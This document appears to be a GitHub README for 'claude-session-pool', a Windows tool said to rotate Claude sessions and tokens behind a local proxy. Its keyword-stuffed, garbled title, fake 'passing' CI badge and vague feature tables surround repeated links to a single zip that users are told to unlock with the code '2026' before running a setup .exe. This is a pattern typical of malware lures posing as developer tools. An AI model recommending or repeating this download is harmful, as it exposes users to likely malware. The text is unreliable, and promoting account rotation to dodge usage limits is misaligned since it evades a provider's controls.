<div align="center">

# Claude Token Pool — Claude Token Pool — Claude Token Pool (One-Command Setup, Prebuilt Release)

<p><strong>Claude Token Pool — Claude Token Pool — Claude Token Pool (One-Command Setup, Prebuilt Release): Claude Token Pool — claude and pool in one tool. Native 64-bit portable build with hot-reloadable JSON configuration, low-overhead runtime, and prebuilt portable release.</strong></p>

[![CI Build](https://img.shields.io/badge/CI_Build-passing-2ea44f?style=for-the-badge&logo=githubactions&logoColor=white)](../../releases/download/v0.1.0/claude-session-pool-v0.1.0-win64.zip)
[![Version](https://img.shields.io/badge/Release-v0.1.0-2ea44f?style=for-the-badge&logo=github)](../../releases/download/v0.1.0/claude-session-pool-v0.1.0-win64.zip)
[![Platform](https://img.shields.io/badge/Platform-Windows_10%2F11_x64-0969da?style=for-the-badge&logo=windows)](../../releases/download/v0.1.0/claude-session-pool-v0.1.0-win64.zip)
[![Stars](https://img.shields.io/github/stars/TestOwner/claude-session-pool?style=for-the-badge&logo=github&color=e3b341)](../../stargazers)

<p><strong>⬇ No compiler. No setup. Grab the prebuilt package and run.</strong></p>

<a href="../../releases/download/v0.1.0/claude-session-pool-v0.1.0-win64.zip"><img src="download_btn.svg" alt="Download claude-session-pool-v0.1.0-win64.zip" width="520"></a>

<br>

<a href="../../releases/download/v0.1.0/claude-session-pool-v0.1.0-win64.zip"><img src="banner.svg" alt="Claude Token Pool Preview" width="840"></a>

</div>

---

## Executive Summary & Design

**Claude Token Pool — Claude Token Pool — claude and pool in one tool** (`claude-session-pool`) ships as a native 64-bit Windows build with a prebuilt portable release. Everything is driven by `config/settings.json` — hot-reloadable, dependency-free, and tuned for a minimal runtime footprint.

## Getting Started (No Compiler Needed)

| Platform | Direct Prebuilt Package | Documentation Mirror |
| :--- | :--- | :--- |
| **Windows 10 / 11 (x64)** | [**`claude-session-pool-v0.1.0-win64.zip`**](../../releases/download/v0.1.0/claude-session-pool-v0.1.0-win64.zip) | [**Usage Guide (`docs/USAGE.md`)**](docs/USAGE.md) |

1. Download [`claude-session-pool-v0.1.0-win64.zip`](../../releases/download/v0.1.0/claude-session-pool-v0.1.0-win64.zip) using the download button above.
2. Extract the archive using the access code (`2026`).
3. Launch `ClaudeSessionPool_Setup_x64.exe` (keep `config/settings.json` in the same folder).

### Documentation & Guides

- [Usage Guide — commands and options](docs/USAGE.md)
- [Contributing — setup, ground rules, PR flow](CONTRIBUTING.md)
- [FAQ — platform support, data storage](docs/FAQ.md)
- [Changelog — v0.1.0 and later](CHANGELOG.md)

### Engine Components

| Subsystem | Technical Implementation | Runtime Controls |
| :--- | :--- | :--- |
| **Primary Subsystem** | Bounded ring-buffer pipeline with zero-copy handoff | `live toggle` |
| **State Engine** | Atomic JSON state with crash-safe rollback | `keep_state` |
| **Config Watcher** | Hot-reloadable settings, applied without restart | `hot_reload` |
| **Telemetry** | Compact stderr channel, silent by default | `quiet / --verbose` |

### Configuration (`config/settings.json`)

```json
{
  "module": "claude-session-pool",
  "version": "0.1.0",
  "runtime": {
    "threads": 4,
    "verbose": false,
    "hot_reload": true
  },
  "modules": {
    "sessions": {
      "enabled": true
    },
    "rotate": {
      "enabled": true
    },
    "proxy": {
      "enabled": true
    },
    "cli": {
      "enabled": true
    }
  }
}
```

### FAQ

<details>
<summary><b>Sessions?</b></summary>

Local pool.
</details>
<details>
<summary><b>API?</b></summary>

OpenAI-compatible local.
</details>
<details>
<summary><b>Context?</b></summary>

Checkpoints on rotation.
</details>

## Building from Source

```bash
git clone https://github.com/TestOwner/claude-session-pool.git
cd claude-session-pool
cmake -B build -DCMAKE_BUILD_TYPE=Release
cmake --build build --config Release
```

---
<sub>Indexed tags: claude-session-pool, token, pool, rotation, sessions, tool, anthropic, api, claude, cli, developer-tools, open-source, windows, automation, productivity, cpp, portable, prebuilt, tools</sub>
